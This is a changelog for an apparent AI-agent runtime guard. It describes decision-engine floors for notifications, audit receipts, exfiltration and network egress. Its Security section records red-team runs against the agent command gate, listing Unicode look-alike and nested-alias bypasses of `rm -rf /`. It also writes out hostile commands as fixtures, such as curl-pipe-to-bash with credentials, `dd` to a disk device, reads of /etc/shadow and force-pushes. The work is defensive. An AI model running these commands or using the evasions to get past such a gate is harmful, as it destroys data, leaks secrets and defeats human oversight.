- **ADR-015 — notification routing (v0.5 Stage D wave-4).** New zero-dep router `runtime/notify.js` + three transports under `runtime/notify/{discord,slack,email}.js` (pure `node:https` / `node:net` / `node:tls`; no `nodemailer`, no `axios`, no any third-party HTTP/SMTP package — verified by `scripts/check-zero-deps.sh`). `runtime/decision-engine.js` invokes a single async fire-and-forget hook AFTER receipt assembly + journal append and BEFORE return; the engine NEVER awaits the resulting Promise, transport failure / latency NEVER changes a decision, and the hook is wrapped in try/catch end-to-end so even a synchronous throw inside `notify.js` can't reach the hot path. Receipts gain an additive `notifyAttempted: true` key ONLY when the hook actually fires (contract enabled + matching event); installs without `notifications.enabled === true` keep byte-identical receipts. Four trigger kinds: `approval-request` (severity `info`) when `action === "require-review"`; `kill-switch-fire` (`critical`) when F1 fires; `degraded-mode-entered` (`warning`) on the first process-lifetime decide() with a degraded marker; `adversarial-bypass-detected` (`critical`) when a G-series floor produces `block` (forward-compatible no-op until G-series ships). PII scrubber is **allowlist-only** — `scrubForNotify()` returns exactly `{action, riskLevel, reasonCodes, floorFired, decisionKey, contractRevision, timestamp, ambientClass}` plus `snapshotId` promoted from `receipt.snapshot.snapshotId`; every other field (tool args, IR `outputs[]`, env values, file contents, `cwd`, `targetPath`, `notes`, anything tagged secret in the contract) is dropped. Scrubber is byte-stable across re-scrub. Discord transport validates `https://discord.com/api/webhooks/` URL prefix; Slack validates `https://hooks.slack.com/services/`; email transport reads creds from env (`LILARA_SMTP_HOST/PORT/USER/PASS/FROM`) and sends text/plain only (no HTML). Per-channel timeout 5s; up to 3 attempts with exponential backoff `[200ms, 1s, 5s]`; 5xx retries, 4xx terminates; exhausted retries DROP the notification with a `degraded-mode:exhausted-retries:<last>` marker on the journal `notify` entry — engine return is unchanged. New `notifications` block in `schemas/lilara.contract.schema.json` is purely additive (absent ⇒ disabled). New `horus notify {test,show,history}` subcommands in `scripts/lilara-cli.sh`. Two new test files: `tests/runtime/notify-scrub.test.js` (9 cases — full adversarial corpus including AWS / GitHub / OpenAI / Slack / SSH-private-key / JWT / Authorization-bearer secrets plus `/home/<user>/.ssh/` paths and email-address content; asserts zero plaintext survives, output is allowlist-only, idempotent across re-scrub, and `loadNotifyConfig` defaults to disabled) and `tests/runtime/notify-transport.test.js` (12 cases — `node:http` mock servers assert canonical-JSON payload + correct headers + retry-on-5xx + give-up-after-3 + 4xx-no-retry for discord and slack; `node:net` mock SMTP server asserts AUTH LOGIN credential round-trip + DATA + recipient match + socket timeout enforcement; engine integration verifies `decide()` returns in <200ms with notifications disabled and `notifyAttempted` is absent on disabled installs; router asserts `notify()` always resolves and never rejects even when a transport throws synchronously). New `references/adr-015-notifications.md` documents the opt-in default, severity model, allowlist scrub contract, retry+timeout policy, fail-open contract, threat model (compromised webhook URL = receipt-metadata leak only, no plaintext; SMTP creds in env not config; webhook prefix validation; no adversarial event injection), and what's NOT in v0.5 (Telegram, mobile push, voice — deferred to M9; multi-channel approval handshake — M9 commercial; rate-limiting / dedup / encrypted bodies — out of scope). Zero floor-ordering change, zero adapter change, zero existing-decision change, zero new fixture, zero dependency change.

- **ADR-014 — audit-grade receipts (v0.5 Stage D wave 3).** Schema-additive review + tooling layer that makes the journal entry shape formally SOC2-readable. Zero floor change, zero decision change, zero new runtime dependency. New JSON Schema at `schemas/receipt.v1.json` (draft-2020-12, `additionalProperties: false`) enumerates every field `runtime/decision-journal.append()` may emit — including the additive `degradedMode`, `f19Detail`, `changeIntent`, `snapshot`, `irHash`, `latticeVersion`, `rung`, `ambientClass`, `ambientPath` keys that landed during Stage D waves 1-2. New zero-dep helper `runtime/receipt-validator.js` exports `validateReceipt(receipt) → { valid, errors[] }` (pure structural check, draft-2020-12 subset: `type`/`enum`/`const`/`pattern`/`format: date-time`/`minLength`/`maxLength`/`items`/`minimum`/`maximum`/`required`/`additionalProperties: false`) and `validateJournalChain({ entries, chainFile? }) → { valid, schemaErrors[], chainErrors[] }` that pairs schema validation with ADR-004 hash-chain `verify()`. `decision-journal.append()` gains an opt-in `LILARA_VALIDATE_RECEIPTS=1` dev-mode hook that throws on any invalid assembled receipt before journaling — production hot path skips for perf. New zero-dep `runtime/receipt-export.js` exports jsonl (canonical-JSON, alphabetical keys) or CSV (deterministic columns tied to `schema.properties` insertion order) with `{ since, until, sessionId, decisionAction, riskLevel, kind }` filtering at millisecond boundaries; `roundTrip(buffer, "jsonl")` proves the exporter is its own inverse (export → parse → re-export = byte-identical). Optional `redact: true` walks every string leaf and rewrites F19-class secret matches to `[REDACTED:<class>:<sha256-prefix-12>]` proof-of-existence tokens — byte-stable across re-export, collision-free at 12 hex chars within an adversarial test corpus, and the resulting receipt still validates clean against the schema. Bundle manifest sha256 reuses the ADR-011 state-bundle pattern: two byte-identical exports produce identical `bundleHash` regardless of `createdAt`. New `scripts/generate-receipt-schema.sh` is a CI gate: replays every `tests/fixtures/lattice-receipts/*.input` through `decide()`, collects the union of top-level keys emitted across every journal entry, fails if any key is not in `schema.properties`, and asserts the schema is byte-stable on canonical 2-space pretty-print re-serialise. New `lilara-cli.sh receipts` subcommand surface: `validate [--journal <path>] [--chain <path>]`, `export [--since <iso>] [--until <iso>] [--format jsonl|csv] [--out <path>] [--session-id <id>] [--decision-action <act>] [--risk-level <lvl>] [--redact]`, `schema [--print]`, `doctor` (round-trip check on the on-disk journal). New documentation: `references/adr-014-audit-grade-receipts.md` (versioning policy, redaction threat model, exporter format rationale, hard non-goals) and `references/soc2-receipt-mapping.md` (informal field-by-field SOC2 TSC control mapping — explicitly labelled NOT an attestation). New tests: `tests/runtime/receipt-schema.test.js` (13 cases: minimal entry validates, unknown field rejected, missing required rejected, type mismatch rejected, bad ISO rejected, schema shape, nested degradedMode validation, redactInJournal const-check, chain folding, every lattice-receipts fixture replay passes schema, tampered hash-chain detection), `tests/runtime/receipt-export.test.js` (8 cases including a 50-receipt fixture-replay end-to-end round-trip), `tests/runtime/receipt-redaction.test.js` (9 cases including adversarial nested, array, multi-class, and post-redact schema validity). Scripts count moves from 82 to **83** (sh + js, top-level); fixture count unchanged at 351. Zero schema change to `lilara.contract.json`, zero floor-ordering change to any existing floor, zero workflow change, zero dependency change.

- **ADR-012 — change-intent drift (F20, v0.5 Stage D wave 2).** New zero-dep helper `runtime/change-intent.js` exports `diffEnvelopeVsIr(declared, ir, ctx)`, reusing `runtime/glob-match.js` for path globs and `runtime/intent-classifier.js` for command-class mapping. `runtime/envelope.js` grows an additive `envelope.declaredIntent` sub-document (`{ fileTargets:{allow[],deny[]}, commands[], commandClasses[], networkHosts[], policyPaths[] }`) plus a fail-open `loadDeclaredEnvelope()` reader: ENOENT is silent; malformed JSON / parse error / 24h freshness expiry journal a degraded-mode marker but never throw; existing `build()` / `verify()` and pending-envelope persistence are untouched. `runtime/decision-engine.js` wires a new F20 floor at lattice rung **18.5** (`runtime/decision-lattice.js`) — slotted between F19 (`output-channel-exfiltration` @ 17.875) and `D-CONTRACT-ALLOW` (18) so the F20 action override is applied AFTER F14b and contract-allow / auto-allow-once / trajectory-nudge cannot silently undo it. Six drift classes cover the out-of-intent surface: `file-write` and `file-delete` (path not in `declaredIntent.fileTargets.allow[]` or matches `deny[]`), `command` (commandTokens mismatch vs `declaredIntent.commands[]`), `command-class` (`ir.commandClass` not in `declaredIntent.commandClasses[]`), `network-host` (host not in `declaredIntent.networkHosts[]`), and `policy-edit` (write into contract/policy paths outside `declaredIntent.policyPaths[]`). Severity ladder: `high` → block (≥2 drift classes OR any `policy-edit` drift OR `ir.destructive=true` combined with any drift; non-demotable by learned-allow or contract-allow); `medium` → require-review, demotable only by a one-shot scoped operator token bound to scope `change-intent-drift-medium` (lattice sentinel `operator-token-medium-only`); `low` → receipt-only marker with no decision change; `none` / fail-open → no decision change (helper exceptions journal a degraded-mode marker; the engine never throws). New `horus envelope` CLI subcommand (`set` / `show` / `clear`) in `scripts/lilara-cli.sh` writes `<LILARA_STATE_DIR>/envelope.json` at mode 0600 with 24h freshness. Receipts and journal entries gain an additive `changeIntent` key (`{ declared, drift, classes[], severity, redactedDetails }`) on every F20 evaluation; `runtime/decision-journal.js` schema is purely additive. New tests in `tests/runtime/change-intent.test.js` cover all six helper drift classes plus engine-integration high/medium/low/none/fail-open cases, idempotency, receipt pinning, and envelope-file expiry/malformed handling; new lattice-receipt fixture `tests/fixtures/lattice-receipts/F20-change-intent-drift.input` pins the F20 receipt shape (rung 18.5, latticeVersion 1, irHash present). Fixture count moves from 350 to **351 fixtures**. Zero schema change to `lilara.contract.json`, zero floor-ordering change to any existing floor, zero workflow change, zero dependency change.

- **ADR-010 — output-channel exfiltration guard (F19, v0.5 Stage D PR-α).** New zero-dep `runtime/output-exfil.js` exports `classifyOutput(content, opts)` + `classifyOutputs(records)` reusing `secret-scan.js` patterns and adding engine-baked classes (`ssh-private-key`, `aws-access-key-id`, `aws-secret-access-key`, `github-pat`, `openai-api-key`, `slack-token`, `high-entropy-hex`). `runtime/decision-engine.js` wires the F19 floor at lattice rung 17.875 (after F17, before D-CONTRACT-ALLOW): confirmed-severity matches early-block via `buildEarlyBlock`; `suspicious` matches route to require-review and are demotable only by a one-shot scoped operator token (`LILARA_F19_DEMOTE_TOKEN`, scope `output-exfil-review-demote`); PreToolUse on a `not-observed` channel applies the compensating stricter rule. `runtime/action-ir.js` gains additive `outputs[]` and `declaredOutput[]` arrays (record shape `{ channel, content, sizeBytes, truncated, observedBy }`). All six adapter manifests gain the additive `outputChannelObservability` map (channels: `stdout`, `stderr`, `generatedFile`, `commitMessage`, `prText`, `finalMessage`; values: `observed` / `limited` / `not-observed`) plus an optional `outputChannelCompensations` registry; the G4 capability-manifest gate (`scripts/check-adapter-manifests.sh`) is extended to require both. Receipts and journal entries surface `outputChannel`, `matchClasses[]`, `redactedSample` (≤32 chars, masked), and `compensatingRestrictionApplied`. New tests in `tests/runtime/output-exfil.test.js` cover 9 `classifyOutput` cases plus 5 engine-integration cases (PostToolUse-block, PreToolUse-not-observed compensating, suspicious-demoted, suspicious-no-token require-review, confirmed-non-demotable) plus 1 idempotency case; new lattice-receipt fixture `tests/fixtures/lattice-receipts/F19-output-channel-exfiltration.input` pins the F19 receipt shape. Fixture count moves from 349 to **350 fixtures**. Zero schema change to `lilara.contract.json`, zero floor-ordering change to any existing floor, zero workflow change, zero dependency change.

- **ADR-004B — degraded-mode enforcement wiring + receipts (PR 37B).** Extends the tamper-evident journal engine (PR 37A) with operational degraded-mode awareness. New zero-dep helper `runtime/degraded-mode.js` reads `LILARA_DEGRADED=1` or an equivalent contract flag and exposes `isDegradedMode(input, contract)`. `runtime/decision-engine.js` applies degraded-mode suppression for F4/F15-F18 floor demotions and routes write-like allow decisions through `require-review` when degraded mode is active. Journal entries and receipts gain an additive `degradedMode: true` marker for audit completeness. New tests cover degraded-mode allow→require-review routing, floor-suppression, receipt/journal field presence, and backwards-compat with degraded=false. Fixture count moves from 348 to **349 fixtures**; scripts count unchanged. Zero HEC change, zero workflow change, zero adapter change, zero dependency change.

- **F17 PR-A — cross-agent lock floor (engine-baked enforcement).** First slice of the HAP v0.5 cross-agent lock. New zero-dep module `runtime/cross-agent-lock.js` reads state-dir-local lock records from `<LILARA_STATE_DIR>/cross-agent-locks/*.json` (lock record fields: `agentId`, `path` or `projectRoot`, `mode` ∈ {`exclusive`, `shared`}, `expiresAt` epoch-ms, `reason`). `runtime/decision-engine.js` fires a new F17 floor (`name: "cross-agent-lock"`, `source: "cross-agent-lock-held"`, `action: "block"`, rung 17.75, non-demotable, `demotableBy: []`) when a write-like call (`writeIntent` true, or `commandClass ∈ {destructive, write, mutate}`, or non-empty `ir.fileTargets` with write/delete intent) targets a path or project held by a different agent's unexpired exclusive lock. Same-agent locks and shared locks pass; expired records are ignored. Fail-closed on malformed/unreadable lock state for write-like calls only — read-only calls are unaffected. `runtime/decision-lattice.js` gains a frozen `F17` entry between F16 (rung 17.5) and F18 (rung 18+); LATTICE self-check covers ordering. New fixture pin at `tests/fixtures/lattice-receipts/F17-cross-agent-lock.input` shapes the receipt; new tests at `tests/runtime/cross-agent-lock.test.js`. Fixture count moves from 347 to **348 fixtures**; scripts count unchanged at 82. Zero HEC change, zero workflow change, zero adapter change, zero dependency change.

- **ADR-009 PR-B — F16 ambient-authority floor + `scopes.ambient.allow[]` opt-in.** Turns the PR-A path classifier into a hard floor. `runtime/decision-lattice.js` gains a frozen `F16` entry at rung 17.5 (`name: "ambient-authority"`, `source: "ambient-authority-denied"`, `action: "block"`, `demotableBy: []`, predicateRef `runtime/decision-engine.js + runtime/ambient.js`) — non-demotable, slotted between F15 envelope (rung 17) and `D-CONTRACT-ALLOW` (rung 18). `runtime/decision-engine.js` hoists `classifyAmbientPath` from `runtime/ambient.js`, adds three helpers (`_normAmbientPath` mirroring ambient.js's `\\→/`, `file://` strip, trailing-slash trim; `_isInsideProject` segment-aligned containment check; `_matchAmbientAllow` case-insensitive segment-aligned pathPrefix matcher), a `_collectAmbientCandidatePaths` extractor that reads `input.targetPath` + `input.ir.fileTargets` (write/delete intent only) + `input.envelope.targets`, and an `_evalAmbientFloor` predicate that fires the floor via `buildEarlyBlock("ambient-authority-denied", …)` immediately after F15 and before risk-scoring + demotion rungs. `buildEarlyBlock` plumbs `ambientClass` + `ambientPath` into the receipt + journal entry on F16 fire only (PR-C generalizes to every ambient touch per ADR-009 §2). Project-local exception: writes that classify as `gitConfig` or `ideSettings` AND segment-align inside `projectRoot` skip the floor (legitimate `<projectRoot>/.git/config`, `<projectRoot>/.vscode/`); every other ambient class (ssh, shellRc, packageCache, credentialHelper, mcpConfig, browserProfile, osKeychain) fires regardless of project membership. `schemas/lilara.contract.schema.json` gains an additive `scopes.ambient.allow[]` block (`class` enum-restricted to the 9 non-`nonAmbient` ambient classes; optional `pathPrefix` and `reason ≤ 200 chars`; `additionalProperties: false` on both the block and each entry). Backwards-compat: contracts without `scopes.ambient` retain default-deny (F16 fires whenever it would otherwise fire). New fixtures: 10 under `tests/fixtures/floor-f16/` covering ssh/shellRc outside, project-local gitConfig/ideSettings allow, in-project ssh still blocks, class-only opt-in, pathPrefix MATCH/MISMATCH, and an unaffected nonAmbient write; 1 canonical receipt-shape pin at `tests/fixtures/lattice-receipts/F16-ambient-authority.input`. New tests: 14 cases in `tests/runtime/ambient-floor.test.js` including an explicit F15 < F16 lattice-ordering test. New script: `scripts/check-floor-f16.sh` (wired into `run-fixtures.sh`). `scripts/check-lattice-ordering.sh` expectedFloors list extended with `F16`; `scripts/check-lattice-receipts.sh` recognises `expected.ambientClass`. `tests/fixtures/decision-engine/floor-demotion-matrix.input` gains an F16 row asserting every common demotion source is rejected. Fixture count moves from 336 to **347 fixtures**; scripts count 80 → 81. Zero HEC change, zero workflow change, zero adapter change, zero dependency change. See `references/adr-009-ambient-authority-classifier.md` §7 for the PR-B contract.
- **D-007 — `scopes.network.allowPlaintext` opt-out (F18 Lane 4).** Default-deny gate for plaintext `http://` outbound URLs under the F18 network egress family (ADR-005). New schema field `scopes.network.allowPlaintext: boolean` (default `false`) — schema-additive, behavior-additive when the contract has no F18 enforcement signal at all. F18 enforcement now activates when ANY of `allowDomains`, `denyDomains`, or `allowPlaintext` is present in `scopes.network`; existing F18-unaware contracts are unchanged. New floor reason `plaintext-target-blocked` (stable identifier for replay tooling) fires AFTER `deny-domain-match` / `ip-literal-blocked` / `host-not-in-allowlist` in `runtime/network-egress.js:evaluate()`; bare-host invocations (`curl example.com`) are treated as plaintext per the existing synthesized-`http://` heuristic. Loopback (127.0.0.0/8, ::1, localhost) is exempt — `allowPlaintext` does not gate loopback. `runtime/decision-engine.js` wires the predicate into a `buildEarlyBlock("plaintext-target-blocked", …)` with `floorFired: "plaintext-target-blocked"` and `decisionSource: "F18-D007"`. `runtime/decision-lattice.js` gains a frozen `F18-D007` entry at rung 16.5, adjacent to F18; `tests/fixtures/decision-lattice/lattice-self-check.input` mirrors the new row. Fixture count moves from 302 to **310 fixtures** with 8 new gate-level fixtures under `tests/fixtures/network-egress/` covering: http default-deny block, http with `allowPlaintext:true` pass, https pass, bare-host default-deny block, bare-host with `allowPlaintext:true` pass, mixed https/http (block on the http one), http loopback pass (loopback exempt), and no-network-section contract pass (backwards-compat). The runner is contract-aware: each fixture's `.input` carries an inline `_contract` block that the runner materializes into a per-fixture tmpdir with canonical `contractHash`. Zero new runtime deps; adapters untouched (F18 enforcement is contract-side). See `workstreams/agent-runtime-guard-plan.md` §8 D-007.

### Security

- **Adversarial corpus re-confirmation + expansion (post-PR #31, 2026-05-13).** Re-ran the three ADR-008 bypass closures from PR #30 (Cyrillic `рm -rf /`, full-width `ｒｍ -rf /`, nested `args.tool_input.command`, `cmd` alias) plus the twelve-pattern adversarial wave from the original 2026-05-13 brief against current master (post PR #31's precomposed-diacritic / ZWJ-ZWNJ / IPA hardening). All four bypass repros still exit 2 with `destructive-delete-pattern` in stderr under `LILARA_ENFORCE=1`; no fourth bypass found in the destructive-command / secret-exfil class. Of the twelve expansion patterns, six produced critical-class blocks (exit 2) under per-fixture state isolation and are added as new fixture triples under `tests/fixtures/shell-ast/`: `ast-bypass-ls-colors-exfil-enforce` (`shell-ast-unresolvable` on `LS_COLORS=$(curl ... env) ls`), `ast-bypass-oversized-argv-rm-enforce` (`destructive-delete-pattern` on 100-byte argv prefix before `rm -rf /`), `ast-bypass-heredoc-aws-key-enforce` (`payload-class-c` on heredoc with literal AKIA-prefixed key), `ast-bypass-dd-devzero-devsda-enforce` (`disk-write-pattern` on ASCII `dd if=/dev/zero of=/dev/sda` — complements the existing Cyrillic-dd fixture), `ast-bypass-curl-pipe-credential-bash-enforce` (`remote-exec-pattern` on `curl -u user:p@ss ... | bash` — complements the existing Cyrillic-curl-pipe fixture), and `ast-bypass-fullwidth-git-force-push-enforce` (`force-push-pattern` on `git push --ｆｏｒｃｅ origin master` with U+FF46-class full-width `force`; complements the existing Cyrillic-git-push fixture). The remaining six patterns (tool_use_id traversal, mcp deep server-name confusion, `cat ./safe/../../../etc/shadow`, SSH-key read with cwd outside project root, `git reset --hard HEAD~N && git push origin master` without `--force`, Latin Small Letter Rams Horn `ꭇm -rf /`) were observed at engine action levels of `escalate` / `allow` rather than `block` and were intentionally NOT added as expected-BLOCK fixtures, since they are either out-of-scope read operations, design-by-warn (`path-sensitivity-high`, `hard-reset-pattern` are high-risk warn signals rather than critical-block ones), opaque-id fields, MCP names with no Bash payload, or non-homoglyph Latin Extended-D characters that would not actually execute as `rm`. None look like a real fourth bypass in the destructive/secret-exfil class. Fixture coverage grows by 6 (310 → **316 fixtures**) under `tests/fixtures/shell-ast/`. Zero runtime, hook, adapter, schema, or workflow changes; zero new policy weights; zero new dependencies.
- **ADR-008 follow-up — Unicode hardening II (precomposed diacritics, default-ignorables, IPA small-caps).** Read-only adversarial reconfirmation of PR #30 (2026-05-13) passed the original stop-the-line scope (Cyrillic/full-width `rm`, nested `args.tool_input.command`, `cmd` alias) but found five realistic evasions that the initial `normalizeCommand` NFKC + Cyrillic/Greek fold did not cover and that were not yet documented as limitations: `ṙm -rf /` (U+1E59 LATIN SMALL LETTER R WITH DOT ABOVE), `ŕm -rf /` (U+0155 LATIN SMALL LETTER R WITH ACUTE), `r‍m -rf /` (U+200D ZERO WIDTH JOINER inside the verb), `r‌m -rf /` (U+200C ZERO WIDTH NON-JOINER), and `ʀᴍ -rf /` (U+0280 + U+1D0D IPA small-capital Latin letters). All five exited 0 with empty stderr under `LILARA_ENFORCE=1`. Fix tightens `runtime/command-normalize.js` only: (a) switch the verb-recognition arm from NFKC to NFKD so precomposed letter+diacritic forms decompose to base+combining-mark; (b) add a single linear `String.replace` strip pass over default-ignorables (ZWJ, ZWNJ, BOM, soft hyphen, bidi overrides, variation selectors, Mongolian/Khmer/Hangul fillers, U+E0100..U+E01EF variation-selectors-supplement) and combining marks (Mn/Mc — U+0300-036F main block plus Hebrew/Arabic/Cyrillic/symbol/half-mark ranges); (c) extend the curated confusables map with the IPA Small Capital Latin Letters block for the destructive-verb letter set (`ᴀʙᴄᴅᴇꜰɢʜɪᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡ` → ASCII). The ASCII fast path is preserved — pure-ASCII inputs still take the single-scan branchless path with no NFKD, no regex, no allocations. `runtime/risk-score.js`, the dual-path matcher, the precedence ladder, and `extractCommand` are unchanged. Fixture coverage grows by 5 (297 → **302 fixtures**) under `tests/fixtures/shell-ast/` — one fixture per evasion, all expected BLOCK / `destructive-delete-pattern`. New unit cases in `tests/runtime/command-normalize.test.js` cover each evasion plus benign-text regression (Russian `Привет, мир`, Greek `α β γ`, Latin diacritic `café`) and additional default-ignorable / variation-selector strips (45 cases total, zero deps). Direct repro of all five evasions now exits 2 with `destructive-delete-pattern` in stderr. Zero policy-weight changes; zero workflow YAML changes; zero new runtime deps. See `references/adr-008-unicode-and-precedence-defense.md` §6 (now §6.5 in the same doc records the closed evasions).
- **ADR-008 — Unicode look-alike + ADR-007 §4.2 precedence defense (STOP-THE-LINE fix for the 2026-05-13 adversarial corpus run).** The corpus produced three real bypasses of the runtime decision engine when invoked through `claude/hooks/dangerous-command-gate.js` in enforce mode: (1) Cyrillic and full-width Latin look-alikes (e.g. `рm -rf /` with U+0440 Cyrillic er, `ｒｍ -rf /` with full-width letters) slipped past every ASCII destructive-verb regex in `runtime/risk-score.js:31`; (2) commands nested under `args.tool_input.command` short-circuited the gate because `claude/hooks/hook-utils.js:48-56` `commandFrom()` only probed `args.command` / `tool_input.command` at the top level; (3) the documented ADR-007 §4.2 `cmd` alias was not in `commandFrom()` at all, so `{"tool_name":"Bash","cmd":"rm -rf /"}` exited 0 with empty stderr. Fix lands a new zero-dep engine module `runtime/command-normalize.js` exporting `normalizeCommand(raw)` (NFKC + Cyrillic/Greek script-confusables map covering the letters used in `rm`, `dd`, `chmod`, `curl`, `wget`, `sudo`, `mkfs`, `kubectl`, `npx`, `DROP`, `git`, `push`, `force`) and `extractCommand(input)` (ADR-007 §4.2 precedence ladder: `command | cmd | tool_input.{command,cmd} | input.{command,cmd} | args.{command,cmd} | args.tool_input.{command,cmd} | args.input.{command,cmd}`, first-non-empty wins, recursive descent bounded to one level under `args`). `runtime/risk-score.js` now evaluates every destructive-verb predicate against both the raw command and `normalizeCommand(raw)` (dual-path matching) so the ASCII regexes themselves remain unchanged for human review while Unicode evasions fire the same `reasonCodes`. `claude/hooks/hook-utils.js` `commandFrom()` delegates to `extractCommand()`; `runtime/pretool-gate.js` re-extracts via `extractCommand()` as a defense-in-depth backstop when the adapter hands the gate an empty string but `rawInput` carries the command under a nested alias. Fixture coverage grows by 12 (285 → **297 fixtures**) under `tests/fixtures/shell-ast/` — one fixture per leak, plus the missing alias positions and a benign-Cyrillic regression for over-block detection. New unit test `tests/runtime/command-normalize.test.js` (29 cases, zero deps) pins the precedence ladder. Direct repro of all three brief-attached leaks now exits 2 with `destructive-delete-pattern` (#1, #2, #3) in stderr. See `references/adr-008-unicode-and-precedence-defense.md`.

### Added

- **HAP ADR-007 PR-C — Floor sources / receipts / schema anchored in LATTICE.** Switches every `floorFired` and `decisionSource` string the engine emits from a bare literal to a read off `runtime/decision-lattice.js`; routes every post-floor demotion through the new `canDemote(floorId, attemptedSource)` helper backed by each entry's `demotableBy` array; flips `LILARA_IR_JOURNAL` default to on (still gated off with `LILARA_IR_JOURNAL=0` for one release). `runtime/decision-engine.js` resolves a `_F1`/`_F2`/…/`_LA`/`_AAO`/`_CA`/`_TN` set of LATTICE constants at module load and reads `.name` / `.source` from them — no `source = "…"` literal remains. ADR-002 Option B (F4 demotion via `LILARA_F4_DEMOTE_TOKEN`) now gates through `canDemote(F4.id, "operator-token:class-c-review-demote")`; ADR-005 W11 carve-out (F9 demotion via `tool-allow-matched`/`tool-allow-tool-scope`) gates through `canDemote(F9.id, …)`. Two LATTICE entries renamed for receipt parity with what the engine writes — F18.name `network-egress-denied` → `network-egress`, F15.name `execution-envelope-diverged` → `execution-envelope` (the `-denied`/`-diverged` form lives on `source`). New helper `canDemote(currentFloorId, attemptedSource)` in `runtime/decision-lattice.js` returns true only when `attemptedSource` is explicitly listed in `demotableBy`; unknown floor / empty source / null inputs all return false. Three new CI gates: `scripts/check-no-implicit-demotion.sh` (every `source =` reassignment in `decision-engine.js` must derive from a `_F*`/`_LA`/`_AAO`/`_CA`/`_TN`/`LATTICE.*`/`getEntry(...)` read), `scripts/check-lattice-receipts.sh` (19 per-floor fixtures pin the emitted `action`/`decisionSource`/`floorFired`/`rung`/`latticeVersion`/`irHashPresent`), `scripts/check-receipt-schema.sh` (replays the sample journal + the lattice-receipts fixtures and asserts every emitted journal entry conforms to the additive-only schema). 20 new fixtures: 19 under `tests/fixtures/lattice-receipts/` (one per floor, plus F04b demoted-secret and F09b session-risk-tool-allow-demoted) and one `tests/fixtures/decision-engine/floor-demotion-matrix.input` golden table that asserts every `(floor, attemptedSource)` pair against `canDemote()`. Fixture count moves from 316 to **336 fixtures** (PR-C adds 20 fixtures on top of the adversarial-expanded base of 316 = D-007 base 310 + 6 adversarial shell-ast triples); scripts count 74 → 77. Zero floor predicate or ordering changes; receipt schema additive-only; Hard Ethical Core untouched. Behavior is byte-identical to master modulo the `irHash`/`latticeVersion`/`rung` journal fields, which are now on by default.
- **HAP ADR-007 PR-B — Adapter-side IR build + cross-adapter parity fixtures.** Wires `actionIr.build()` into the enforcement spine and proves byte-identical canonical IR across the 6 harness adapters. `runtime/action-ir.js` build() now extracts `commandTokens` (via `runtime/arg-extractor.js`), `commandClass` (via `runtime/decision-key.js`), `argv0`, `fileTargets` (path-resolved against cwd, URL-filtered, sensitivity-classified), `networkTargets` (URL parser), `mcpServer` (regex on tool name), `payloadClass` (inline classifier + optional `secret-scan`), `destructive`/`writeIntent` (commandClass-driven), and auto-computes `irHash`. `runtime/pretool-gate.js` builds the IR on every gate invocation and threads it into `decide()` (back-compat shim — adapters that don't pre-build still work). `runtime/decision-engine.js` ingests `input.ir`; when `LILARA_IR_JOURNAL=1`, journal entries gain additive `irHash` + `latticeVersion` (and `rung` when `floorFired` maps to a known lattice name via the new `getRungByName` helper). `runtime/decision-journal.js` schema is purely additive. Six new manifests at `<harness>/manifest.json` declare `harness`, `harnessVersion`, `envelopeReporting`, `argsFidelity`, `cwdFidelity`, `mcpInterception`, `skillInterception`, and `outputChannels`; exact-fidelity for claude/opencode/openclaw, best-effort + unverified for codex/clawcode/antegravity. `claude/hooks/hook-utils.js` gains `loadManifest(harness)` + `extractTrustMeta` hook on `createAdapter`; all 6 adapters publish via `() => loadManifest(<harness>)`. New CI gate `scripts/check-action-ir-parity.sh` asserts 6 baseline scenarios (rm-rf, force-push, curl-pipe, secret-payload, safe-ls, safe-git-status) × 6 adapters produce byte-identical IR (modulo harness-specific fields). 42 new fixtures under `tests/fixtures/action-ir/{<adapter>,parity}/` (36 input + 6 canonical expected-ir.json). Fixture count moves from 249 to **285 fixtures**; scripts count 73 → 74. Zero floor predicate or ordering changes; contract schema byte-unchanged; Hard Ethical Core untouched. Behavior is byte-identical to master with `LILARA_IR_JOURNAL` unset.
- **HAP ADR-007 PR-A — Canonical Action IR + decision lattice (skeleton, no behavior change).** Lands the foundation modules required by `agent-runtime-guard-scope.md` §4.1 invariants 9 + 10: `runtime/decision-lattice.js` (frozen `LATTICE` table — rung/action/source/demotability for every floor including rung-0 `L1` reservation for the v1.0 Hard Ethical Core, plus declarative entries for the demotion/promotion rungs `contract-allow`, `learned-allow`, `auto-allow-once`, `trajectory-nudge`; helpers `getEntry`, `getRung`, `getFloor`, `listFloors`, `assertOrdered`; opt-in self-test under `LILARA_LATTICE_SELFTEST=1`) and `runtime/action-ir.js` (`EMPTY_IR`, `IR_VERSION="1"`, `build(input, ctx)` conservative best-effort builder returning a frozen IR, `validate(ir) → {ok, reason}`, `canonicalize`, `irHash` via `runtime/canonical-json.js`). Both modules zero-dep, pure (no I/O), and re-exported from `runtime/index.js` as `actionIr` + `decisionLattice` namespaces. **Zero behavior change** in this PR: `decision-engine.js` and `pretool-gate.js` are untouched; floor predicates, ordering, outcomes unchanged; contract schema byte-unchanged; Hard Ethical Core untouched. New CI gate `scripts/check-lattice-ordering.sh` asserts table invariants (strictly-increasing rungs, unique ids, frozen entries, required fields) and IR skeleton invariants (frozen EMPTY_IR, build/validate round-trip, irHash canonical-stability). Two baseline fixtures (`tests/fixtures/decision-lattice/lattice-self-check.input`, `tests/fixtures/action-ir/empty-ir.input`) snapshot the data shapes for human review + future parity tests; total fixture count moves from 247 to **249 fixtures**. PR-B will wire `actionIr.build()` into adapters as a back-compat shim and add cross-adapter parity fixtures; PR-C switches `decision-engine.js` source/floor labels to lattice constants and adds `irHash`/`rung`/`latticeVersion` to receipts (additive); PR-D adds replay + adversarial seed + perf gates. See `references/adr-007-canonical-action-ir.md` and `DECISIONS.md` D49.
